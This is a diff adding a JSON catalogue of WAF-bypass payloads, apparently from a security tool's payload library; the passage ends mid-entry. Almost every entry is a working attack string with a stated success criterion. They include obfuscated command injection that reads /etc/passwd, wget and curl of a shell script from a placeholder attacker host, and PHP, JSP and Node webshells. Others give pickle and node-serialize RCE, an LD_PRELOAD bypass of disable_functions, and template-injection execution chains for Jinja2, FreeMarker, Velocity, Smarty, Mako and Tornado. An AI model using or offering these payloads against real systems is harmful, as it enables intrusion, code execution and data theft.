@@ -1,0 +1,1557 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "cmdi2-waf-bypass-variable-expansion",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "c${undefined}at /etc/passwd\nc${DOESNOTEXIST}at /etc/passwd\nc\\a\\t /etc/passwd\nc''at /etc/passwd\nc\"\"at /etc/passwd\nw''get http://{ATTACKER_HOST}/shell.sh\nc''u''r''l http://{ATTACKER_HOST}/shell.sh",
+          "command": "c${PATH:0:1}t${PATH:0:1}etc${PATH:0:1}passwd\nc$@at /etc/passwd\nca$*t /etc/passwd\n;{c'a't,/etc/passwd}",
+          "description": {
+            "zh": "变量扩展的四个新面：${PATH:0:1} 子串重建斜杠（bash ≥3）、$@/$* 空参数展开拼出 cat、花括号组内嵌引号（brace 展开先于引号移除，c'a't 归并为 cat）。命中判据：passwd 内容返回，且请求不含 cat、/etc/passwd 连写字面。",
+            "en": "Four fresh variable-expansion faces: ${PATH:0:1} substring slash rebuilding (bash 3+), empty $@/$* expansion assembling cat, and a quote inside a brace group (brace expansion precedes quote removal, so c'a't collapses to cat). Success: passwd content returned with no adjacent cat /etc/passwd literal in the request."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "cmdi2-command-separators",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "`cat /etc/passwd`",
+          "command": "`c'a't /etc/passwd`",
+          "description": {
+            "zh": "反引号内以成对单引号拆分 cat（引号移除晚于命令替换解析），与执行集的反引号明文行差异化。命中判据：passwd 内容返回且请求无 cat /etc/passwd 连写。",
+            "en": "Splits cat with paired single quotes inside backticks (quote removal happens after command-substitution parsing), staying distinct from the plaintext backtick line in the execution set. Success: passwd content returned with no adjacent cat /etc/passwd literal."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "$(cat /etc/passwd)",
+          "command": "$(v=ca)$(echo ${v}t /etc/passwd|sh)",
+          "description": {
+            "zh": "两段命令替换：第一段仅赋值（无输出），第二段 echo ${v}t 重组 cat 并管道给 sh 执行；赋值与执行分离使 cat 不在任一单段内连写出现。命中判据：passwd 内容返回。",
+            "en": "Two-stage substitution: the first stage only assigns (no output) while the second reassembles cat via echo ${v}t and pipes to sh, so the word cat never appears unsplit inside a single stage. Success: passwd content returned."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "|\n||\n&\n&&\n;\n;;\n%0a\n%0d\n%0a%0d\n%0d%0a",
+          "description": {
+            "zh": "基础命令分隔包含多个可复现输入样例；应逐条测试并记录响应与日志差异。受控样例：用于建立基线/对照，非独立绕过手法。各分隔符在 nginx/Apache/CLI 三类 SAPI 下的实际可达性存在差异，逐项验证后方可判定可达。",
+            "en": "Run this Shell Command-Separator Boundary validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. Separator reachability differs across nginx, Apache, and CLI SAPIs; verify each entry individually before judging reachability."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "cmdi2-php-disable-functions-bypass-6",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "$ffi = FFI::cdef(\"int system(const char *command);\");\n$ffi->system(\"cat /etc/passwd\");\n$cmd = new COM(\"WScript.Shell\");\n$cmd->Run(\"cmd /c whoami\");\n$x='() { :;}; /bin/cat /etc/passwd';\nputenv(\"HTTP_X=$x\");",
+          "command": "$c='FFI'::'cdef';\n$ffi=$c(\"int system(const char *command);\");\n$ffi->system('id');\nputenv('LD_PRELOAD=/tmp/payloader.so');mail('a@localhost','x','','');",
+          "description": {
+            "zh": "FFI 二段式：类常量拼接构造 FFI::cdef 名再调用，规避对 FFI::cdef 直连特征的 disable_functions 审计；LD_PRELOAD+mail 路线在 mail() 触发时由 ld.so 加载恶意 .so 执行命令，绕过仅看函数名黑名单的策略。命中判据：id 输出或 /tmp/payloader.so 被 dlopen 加载的日志。",
+            "en": "A two-stage FFI form: the FFI::cdef name is assembled from concatenated constants before invocation, dodging disable_functions audits keyed on the direct FFI::cdef literal; the LD_PRELOAD plus mail route loads a crafted shared object through ld.so when mail() fires, bypassing name-only function blacklists. Success: id output or loader logs showing /tmp/payloader.so mapped."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "nosql2-python-pickle",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "cos\\nsystem\\n(S'id'\\ntR.\ncos\\nsystem\\n(S'whoami'\\ntR.\ncos\\nsystem\\n(S'cat /flag'\\ntR.\ncos\\nsystem\\n(S'ls /'\\ntR.\nc__builtin__\\nexec\\n(S'import os;os.system(\"id\")'\\ntR.\nc__builtin__\\nexec\\n(S'import os;os.system(\"whoami\")'\\ntR.\nc__builtin__\\nexec\\n(S'import os;os.system(\"cat /flag\")'\\ntR.\nc__builtin__\\nexec\\n(S'import os;os.system(\"ls /\")'\\ntR.",
+          "command": "cbuiltins\\nexec\\n(S'import os;os.system(\"id\")'\\ntR.\ncbuiltins\\nexec\\n(S'import os;os.system(\"whoami\")'\\ntR.\ncbuiltins\\nexec\\n(S'import os;os.system(\"cat /flag\")'\\ntR.\ncbuiltins\\nexec\\n(S'import os;os.system(\"ls /\")'\\ntR.",
+          "title": {
+            "zh": "Python Pickle RCE",
+            "en": "Python Pickle RCE"
+          },
+          "description": {
+            "zh": "与执行集去重后的样例集合：统一使用 Python 3 builtins 模块名（Python 2 无 builtins 且 exec 是语句不能作可调用对象），以 exec 为 sink 的 GLOBAL/exec/REDUCE opcode 流，规避仅拦截 cos.system 的 gadget 特征。命中判据：loads 后命令执行并返回输出。",
+            "en": "A sample set deduplicated against the execution set, uniformly using the Python 3 builtins module name (Python 2 has no builtins and exec is a statement there, not callable) with exec as the sink in GLOBAL/exec/REDUCE opcode streams that dodge gadget rules matching only cos.system. Success: commands execute through loads and return output."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "nosql2-node-js",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"} \n {\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami').toString()}()\"} \n {\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /flag').toString()}()\"} \n {\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('ls /').toString()}()\"} \n {\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').exec('id')}()\"} \n {\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').exec('whoami')}()\"} \n {\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').exec('cat /flag')}()\"} \n {\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').exec('ls /')}()\"}",
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function(){return Function('return require(\\\"child_process\\\").execSync(\\\"id\\\").toString()')()}()\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execFileSync('/bin/sh',['-c','id']).toString()}()\"}\n{\"rce\":\"_$$ND_FUNC$$_function(){return process.mainModule.require('child_process').spawnSync('/bin/sh',['-c','id']).stdout.toString()}()\"}",
+          "title": {
+            "zh": "Node.js 反序列化变形集",
+            "en": "Node.js Deserialization Variant Set"
+          },
+          "description": {
+            "zh": "与执行集的 exec/execSync/spawn 明文行去重后的三个新面：Function 构造器二次包装（规避对 IIFE 后缀 }() 形态的规则）、execFileSync 同步文件执行、spawnSync 取 stdout；均走 node-serialize 的 $$ND_FUNC$$ 函数字符串入口。命中判据：id 输出随反序列化返回。",
+            "en": "Three faces deduplicated from the plaintext exec/execSync/spawn lines: a Function-constructor double wrap (dodging rules on the }() IIFE suffix), synchronous execFileSync, and spawnSync reading stdout, all entering through the node-serialize $$ND_FUNC$$ function-string vector. Success: id output comes back with deserialization."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "webshell-php",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<?php sys/**/tem($_GET['cmd']); ?>\n<?php syst/**/em($_GET['cmd']); ?>\n<?php e/**/va/**/l($_POST['cmd']);?>\n<?php a/**/ss/**/ert($_POST['cmd']);?>\n<?php pa/**/sst/**/hru($_GET['cmd']); ?>\n<?php sh/**/el/**/l_ex/**/ec($_GET['cmd']); ?>\n<?php fil/**/e_ge/**/t_con/**/tents('/flag'); ?>",
+          "command": "<?php /*a*/system/*b*/($_GET[1]); ?>\n<?= system($_GET[1]);/*c*/ ?>\n<?php $f='sys'.'tem';$f($_GET[1]); ?>",
+          "title": {
+            "zh": "注释插入与短标签组合",
+            "en": "Comment Insertion and Short-Tag Combo"
+          },
+          "description": {
+            "zh": "注释插入点规则：PHP 注释只能落在 token 边界（函数名前、函数名与括号间），插入标识符内部会得到两个 T_STRING 产生解析错误，因此进阶位是 token 边界注释打断 <?php system( 整行特征，叠加短标签 <?= 与尾注释组合；第三行以字符串拼接承接变量函数。命中判据：命令输出返回。",
+            "en": "Insertion-point rule: PHP comments only land on token boundaries (before the name, between name and parenthesis); placing one inside the identifier yields two T_STRING tokens and a parse error, so the advanced bit uses boundary comments to break the <?php system( full-line shape, layered with the short echo tag and a tail comment; the third line bridges to a variable function via string concatenation. Success: command output returned."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 9,
+          "expectedCommand": "<?php call_user_func(function(){@eval($_POST[\"cmd\"]);});?>",
+          "description": {
+            "zh": "原始行用于识别危险函数和历史 PHP 变体。实际验证必须把所有命令/参数替换为返回固定字符串的无害表达式，并一次只使用与目标 PHP 版本匹配的一行。命中判据：选定行在目标 PHP 版本上执行并返回固定标记输出。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "The original lines identify dangerous functions and historical PHP variants. For validation, replace every command or parameter with a harmless fixed-string expression and use only one line compatible with the target PHP version. Success check: the chosen line executes on the target PHP version and returns the fixed marker output. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<?php SYSTEM($_GET['cmd']); ?>\n<?php System($_GET['cmd']); ?>\n<?php sYstem($_GET['cmd']); ?>\n<?php EVAL($_POST['cmd']);?>\n<?php ASSERT($_POST['cmd']);?>\n<?php PASSTHRU($_GET['cmd']); ?>\n<?php SHELL_EXEC($_GET['cmd']); ?>",
+          "description": {
+            "zh": "PHP WAF绕过: 大小写，共7条命中判据：大小写变体仍返回命令输出。失效条件：现代 WAF 请求归一化后大小写混淆普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "bypass payloads Success check: the case variants still return command output. Fails when: modern WAFs normalize letter case before matching, so case confusion only holds against custom case-sensitive regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "webshell-php-flag",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<?php readfile('/flag');?>",
+          "command": "<?php readgzfile('/flag');?>",
+          "title": {
+            "zh": "readgzfile 直读变体",
+            "en": "readgzfile Direct-Read Variant"
+          },
+          "description": {
+            "zh": "readgzfile 对非 gzip 文件按原文直读直出，读文件函数面与 file_get_contents/readfile 差异化；成功判据：flag 内容输出。",
+            "en": "readgzfile streams non-gzip files verbatim, moving the read call outside the file_get_contents/readfile signature set. Success: flag content printed."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<?php include('/flag');?>",
+          "command": "<?php include 'da'.'ta'.'://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKTs/Pg==';?>",
+          "title": {
+            "zh": "data:// 拼接包含变体",
+            "en": "data:// Concatenated Include Variant"
+          },
+          "description": {
+            "zh": "include 的 data:// 包装器以拼接拆开 da.ta:// 字面，base64 体解码为读取 /flag 的 PHP 代码再被包含执行；仅 allow_url_include=On 时成立。成功判据：flag 内容输出。",
+            "en": "The data:// wrapper of include has its da.ta:// literal split by concatenation while the base64 body decodes to PHP code that reads /flag and executes on inclusion; requires allow_url_include=On. Success: flag content printed."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti2-freemarker-java",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"id\")</@value>",
+          "command": "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()>\n<@value>import os\nos.system(\"id\")</@value>",
+          "description": {
+            "zh": "JythonRuntime 多语句形态：转换体按行书写 import 与 os.system，字面与执行集的单行分号体差分，可绕过按单行 import;os.system( 连写特征的规则；需模板类路径存在 Jython 支持。命中判据：id 输出或进程创建。",
+            "en": "A multi-statement JythonRuntime form: the transform body writes import and os.system on separate lines, diverging from the single-line semicolon body in the execution set and dodging rules keyed on the one-line import;os.system( shape; requires Jython support on the template classpath. Success: id output or process creation."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti2-xslt-document-function-file-read",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<xsl:value-of select=\"document('/etc/passwd')\"/>",
+          "command": "<xsl:value-of select=\"document('file:///etc/passwd')\"/>\n<xsl:value-of select=\"document('http://127.0.0.1/etc/passwd')\"/>",
+          "title": {
+            "zh": "file scheme 与 SSRF 化 document",
+            "en": "file-Scheme and SSRF document()"
+          },
+          "description": {
+            "zh": "document() 的两个未覆盖面：显式 file:/// scheme 绕过按 document('/ 绝对路径特征编写的规则；http://127.0.0.1 将读取 SSRF 化（依赖本机可达），为无直接文件读权限的解析器提供间接通道。命中判据：passwd 内容出现在渲染输出或本机 HTTP 请求命中。",
+            "en": "Two uncovered document() faces: an explicit file:/// scheme dodges rules keyed on the document(' absolute-path shape, while http://127.0.0.1 turns the read into local SSRF (dependent on loopback reachability) for parsers without direct file access. Success: passwd content in the render output or a loopback HTTP hit."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "rce-htaccess",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "AddType application/x-httpd-php .jpg",
+          "command": "AddHandler application/x-httpd-php .pHo\nphp_value auto_prepend_file /proc/self/environ\n<FilesMatch \"\\.phP$\">\nSetHandler php-script\n</FilesMatch>",
+          "title": {
+            "zh": "处理器映射与 prepend 组合",
+            "en": "Handler Mapping and prepend Combo"
+          },
+          "description": {
+            "zh": "三个新面：.pHo 大小写扩展针对大小写敏感的扩展名黑名单；auto_prepend_file 指向 /proc/self/environ 使每个 PHP 响应先携带环境流内容；FilesMatch 内 SetHandler 以正则大小写混写圈定目标。命中判据：上传目录内 jpg 改名 .pHo 后被当 PHP 执行，或响应前缀出现环境变量内容。",
+            "en": "Three fresh faces: the .pHo mixed-case extension targets case-sensitive extension blacklists, auto_prepend_file pointed at /proc/self/environ makes every PHP response start with the environment stream, and SetHandler inside FilesMatch scopes targets with a case-mixed regex. Success: a .pHo file in the upload dir executes as PHP, or responses start with environment content."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "webshell-jsp-java",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<%Runtime.getRuntime().exec(request.getParameter(new String(new byte[]{99,109,100})));%>",
+          "command": "<%Runtime.getRuntime().exec(request.getParameter(new char[]{99,109,100}));%>\n<%Runtime.getRuntime().exec(request.getParameter(\"cm\"+\"d\"));%>\n<%java.util.Map<String,String[]> pm=request.getParameterMap();for(String k:pm.keySet()){if(\"cmd\".equals(k)){Runtime.getRuntime().exec(pm.get(k)[0]);}}%>",
+          "title": {
+            "zh": "参数名构造与遍历变体",
+            "en": "Parameter-Name Construction and Map Iteration"
+          },
+          "description": {
+            "zh": "参数名获取的三个新面：char 数组构造（与执行集的 byte 数组形态差分）、字符串拼接 \"cm\"+\"d\" 打断 getParameter(\"cmd\") 连写、getParameterMap 遍历取值不出现 getParameter(\"cmd\") 直连。命中判据：cmd 参数驱动命令执行。",
+            "en": "Three fresh parameter-name faces: a char-array construction (distinct from the execution set byte-array form), the \"cm\"+\"d\" concatenation breaking the getParameter(\"cmd\") literal, and a getParameterMap iteration that avoids calling getParameter(\"cmd\") directly. Success: the cmd parameter drives command execution."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "webshell-node-js-express",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "global.process.mainModule.require('child_process').execSync('id').toString()",
+          "command": "require.main.constructor._load('child_process').execSync('id').toString()\nprocess.binding('spawn_sync').spawn({file:'/bin/sh',args:['sh','-c','id'],envPairs:['PATH=/usr/bin:/bin'],stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]}).output[0].toString()",
+          "title": {
+            "zh": "_load 与 spawn_sync 加载链",
+            "en": "_load and spawn_sync Loading Chains"
+          },
+          "description": {
+            "zh": "require 与 mainModule.require 直连之外的加载面：Module 构造器 _load 绕过对 require('child_process') 特征的规则；process.binding('spawn_sync') 直呼内部进程原语，规避 child_process 字面。命中判据：id 输出返回。",
+            "en": "Loading faces beyond direct require and mainModule.require: the Module constructor _load sidesteps rules matching require('child_process'), and process.binding('spawn_sync') calls the internal process primitive without the child_process literal. Success: id output returned."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-jinja2",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "{{ \"JINJA_\" ~ \"E5\" }}",
+          "command": "{{ config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}",
+          "title": {
+            "zh": "attr 链免点号执行链",
+            "en": "attr-Chain Dotless Execution"
+          },
+          "description": {
+            "zh": "全程用 attr 过滤器取属性并调用，整条表达式不含点号与下标括号，绕过按 `.` 属性链、config.__class__ 连写或 __globals__['os'] 特征编写的规则；依赖 Flask 上下文暴露 config 全局。命中判据：模板输出 id 的执行结果。",
+            "en": "Walks attributes and calls through the attr filter so the expression contains no dot or subscript brackets at all, evading rules keyed on dotted chains, the config.__class__ signature, or __globals__['os']; needs a Flask context exposing config. Success: the template renders the output of id."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "{% set marker=\"JINJA_F6\" %}{{ marker }}",
+          "command": "{{- 7 * 7 -}}",
+          "title": {
+            "zh": "空白控制定界变形",
+            "en": "Whitespace-Control Delimiter Variant"
+          },
+          "description": {
+            "zh": "空白控制语法把开定界符字面变为 {{-，绕过对 {{ 精确或前缀匹配的规则，解析树与 {{7*7}} 等价，可作定界符差分指纹与 {{7*7}} 成对提交。命中判据：输出 49。",
+            "en": "The whitespace-control syntax turns the literal opener into {{-, evading exact or prefix rules on {{ while the parse tree stays equivalent to {{7*7}}; pair it with {{7*7}} as a delimiter differential fingerprint. Success: 49 in output."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-freemarker",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "${\"FREEMARKER_\" + \"F6\"}",
+          "command": "${(\"freemarker.template.utility.Execute\"?new())(\"id\")}",
+          "title": {
+            "zh": "内联 ?new() Execute 单行",
+            "en": "Inline ?new() Execute One-Liner"
+          },
+          "description": {
+            "zh": "跳过 <#assign 中转，在插值内直接完成 Execute 实例化与调用，绕过按 <#assign 与 Execute 组合编写的规则。命中判据：输出 id 执行结果。",
+            "en": "Skips the <#assign staging by instantiating and invoking Execute directly inside the interpolation, dodging rules built on the assign-plus-Execute combination. Success: output of id."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "${[\"FREEMARKER\",\"G7\"]?join(\"_\")}",
+          "command": "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}",
+          "title": {
+            "zh": "方括号替代语法",
+            "en": "Square-Bracket Alternative Syntax"
+          },
+          "description": {
+            "zh": "FreeMarker 方括号替代语法（2.3.19 起按模板自动识别）替代尖括号标签，绕过按 <#assign 或 <# 特征编写的规则；插值仍走 ${}。命中判据：输出 id 执行结果。",
+            "en": "FreeMarker alternative square-bracket syntax (auto-detected per template since 2.3.19) replaces angle tags, evading rules keyed on <#assign or <# markers while interpolation still uses ${}. Success: output of id."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-velocity",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "#set($marker = \"VELOCITY_\" + \"F6\")$marker",
+          "command": "#set($rt=$class.inspect(\"java.lang.Runtime\").type.getRuntime())#set($p=$rt.exec(\"id\"))$p",
+          "title": {
+            "zh": "class.inspect 反射执行",
+            "en": "class.inspect Reflective Execution"
+          },
+          "description": {
+            "zh": "Velocity Tools 的 ClassTool 反射加载 Runtime 并执行，绕过对 Runtime.getRuntime() 直写与 FreeMarker 风格 assign+工具类特征的规则；需部署 velocity-tools 且未启用 SecureUmlRestrictor。命中判据：进程创建（延时或 OAST 验证）。",
+            "en": "Loads Runtime reflectively through the velocity-tools ClassTool, dodging Runtime.getRuntime() literals and FreeMarker-style assign patterns; requires velocity-tools on the classpath with no SecureUmlRestrictor. Success: process creation (confirm via delay or OAST)."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "#set($marker = \"VELOCITY_G7\")$marker.length()",
+          "command": "#set($arr=$class.inspect(\"java.util.ArrayList\").type.newInstance())#set($_=$arr.add(\"id\"))#set($pb=$class.inspect(\"java.lang.ProcessBuilder\").type.getConstructor($class.inspect(\"java.util.List\").type).newInstance($arr))#set($_=$pb.start())",
+          "title": {
+            "zh": "class.inspect ProcessBuilder 链",
+            "en": "class.inspect ProcessBuilder Chain"
+          },
+          "description": {
+            "zh": "以 ArrayList 作构造参数走 ProcessBuilder(List) 反射路径启动进程，与 Runtime 直连特征差异化；同样依赖 velocity-tools 且未启用 SecureUmlRestrictor。命中判据：进程创建。",
+            "en": "Starts a process reflectively through the ProcessBuilder(List) constructor with an ArrayList argument, diverging from direct Runtime chains; same velocity-tools and SecureUmlRestrictor caveats. Success: process creation."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-thymeleaf",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<span th:text=\"${'THYMELEAF_' + 'F6'}\">fallback</span>",
+          "command": "[(${7 * 7})]",
+          "title": {
+            "zh": "未转义内联差分",
+            "en": "Unescaped Inlining Differential"
+          },
+          "description": {
+            "zh": "未转义内联 [(${...})] 与算术内联 [[${...}]] 字面前缀不同，绕过按 [[ 与 th:text 编写的规则；未转义通道还会原样输出标记文本。命中判据：输出 49。",
+            "en": "The unescaped inline form [(${...})] differs literally from arithmetic inlining [[${...}]], evading rules keyed on [[ or th:text; the unescaped channel also emits raw marker text. Success: 49 in output."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<span th:text=\"${#strings.length('THYMELEAF_G7')}\">0</span>",
+          "command": "<span th:text=\"__${7 * 7}__\">fallback</span>",
+          "title": {
+            "zh": "预处理表达式",
+            "en": "Preprocessing Expression"
+          },
+          "description": {
+            "zh": "__${...}__ 预处理在表达式解析前先行求值，表达式入口与 th:text=\"${...}\" 不同，绕过按完整属性表达式特征编写的规则。命中判据：span 内容为 49。",
+            "en": "Preprocessing evaluates __${...}__ before expression parsing, giving an entry point distinct from th:text=\"${...}\" and evading rules that match the full attribute expression shape. Success: the span renders 49."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<span th:with=\"marker=${'THYMELEAF_H8'}\" th:text=\"${marker}\">fallback</span>",
+          "command": "<a th:href=\"@{__${7 * 7}__.html}\">x</a>",
+          "title": {
+            "zh": "链接表达式内预处理",
+            "en": "Preprocessing Inside Link Expression"
+          },
+          "description": {
+            "zh": "链接表达式 @{...} 内的预处理同样先行求值，URL 上下文形态与属性表达式差分，绕过只盯 th:text 的规则；结果可从 href 直接观察。命中判据：渲染后 href 含 49。",
+            "en": "Preprocessing also fires inside the link expression, a URL-context shape distinct from attribute expressions that evades rules watching only th:text; the result is directly observable in href. Success: the rendered href contains 49."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-smarty",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "{$marker=\"SMARTY_\"|cat:\"G7\"}{$marker}",
+          "command": "{if shell_exec('id')}{/if}",
+          "title": {
+            "zh": "{if} 内联 PHP 求值",
+            "en": "Inline PHP Evaluation in if-Tag"
+          },
+          "description": {
+            "zh": "Smarty 的 {if} 标签把条件编译为 PHP 表达式直接求值，是 {php} 标签自 3.1 移除后的存活执行路径；以 shell_exec 为 sink 与同库 system 形态差异化，仅 $security_policy 未限制函数时可调用。命中判据：输出 uid。",
+            "en": "The Smarty if tag compiles its condition into a live PHP expression, the surviving execution route since {php} was removed in 3.1; shell_exec as the sink differentiates from the sibling system form in the library, and it is callable only when $security_policy does not restrict functions. Success: uid output."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "{$marker=\"SMARTY_H8\"}{$marker|strlen}",
+          "command": "{include file='/etc/passwd'}",
+          "title": {
+            "zh": "模板 file 资源读文件",
+            "en": "Template file-Resource File Read"
+          },
+          "description": {
+            "zh": "include 的默认 file 资源按模板读取任意路径，替代 file_get_contents/readfile 等被查杀函数特征；非 PHP 标记内容原样输出。命中判据：passwd 内容出现在模板位置。",
+            "en": "The default file resource of include reads arbitrary paths as templates, replacing flagged read functions; non-PHP content passes through verbatim. Success: passwd content at the template position."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "{$marker=\"SMARTY_I9\"}{$marker|default:\"DEFAULT\"}",
+          "command": "{fetch file='/etc/passwd'}",
+          "title": {
+            "zh": "fetch 插件读文件",
+            "en": "fetch Plugin File Read"
+          },
+          "description": {
+            "zh": "fetch 核心插件把文件或 URL 内容拉入模板输出，绕过对读文件函数与 include 行为的规则；仅目标文件进程可读时成立。命中判据：passwd 内容输出。",
+            "en": "The core fetch plugin pulls file or URL content into template output, sidestepping rules on read functions and include behavior; holds only when the target file is readable by the process. Success: passwd content in output."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-mako",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "${\"MAKO_\" + \"F6\"}",
+          "command": "<%\nimport os\n%>${os.popen('id').read()}",
+          "title": {
+            "zh": "代码块导入执行",
+            "en": "Code-Block Import Execution"
+          },
+          "description": {
+            "zh": "<% %> 代码块在渲染层执行任意 Python 导入，模块引用随后在 ${} 插值使用，绕过仅匹配 ${...} 插值特征的规则。命中判据：输出 id 执行结果。",
+            "en": "The code block runs arbitrary Python imports at render time and the module reference is used in the following expression, dodging rules that only match interpolation bodies. Success: the output of id."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "${len(\"MAKO_G7\")}",
+          "command": "${__import__('o'+'s').popen('id').read()}",
+          "title": {
+            "zh": "表达式内拼接导入",
+            "en": "Concatenated Import in Expression"
+          },
+          "description": {
+            "zh": "在插值表达式内以字符串拼接构造模块名再 __import__，字面不含 import os 与 os. 连写特征。命中判据：输出 id 执行结果。",
+            "en": "Assembles the module name by concatenation inside the expression before __import__, so the literals import os and the dotted os. prefix never appear unsplit. Success: the output of id."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "${{\"marker\":\"MAKO_H8\"}[\"marker\"]}",
+          "command": "<%!\nimport subprocess\n%>${subprocess.check_output(['id']).decode()}",
+          "title": {
+            "zh": "模块级代码块变体",
+            "en": "Module-Level Code-Block Variant"
+          },
+          "description": {
+            "zh": "<%! %> 模块级块把导入提升到生成模块顶部（整页仅执行一次），与 <% 常规块字面不同，绕过按单层代码块特征的规则；check_output 以参数列表执行不经 shell。命中判据：输出 uid。",
+            "en": "The module-level block hoists imports to the top of the generated module (executed once per render unit), a literal distinct from the plain block that dodges single-block signatures; check_output runs argument-list style without a shell. Success: uid output."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-tornado",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "{{ \"TORNADO_\" + \"F6\" }}",
+          "command": "{% import os %}{{ os.popen('id').read() }}",
+          "title": {
+            "zh": "语句块导入执行",
+            "en": "Statement-Block Import Execution"
+          },
+          "description": {
+            "zh": "Tornado 的 {% %} 语句块支持顶层导入，模块引用随后在 {{ }} 插值使用，绕过仅匹配 {{...}} 输出定界符的规则。命中判据：输出 id 执行结果。",
+            "en": "Tornado statement blocks accept top-level imports and the module reference lands in the following expression, evading rules that only match the output delimiters. Success: the output of id."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
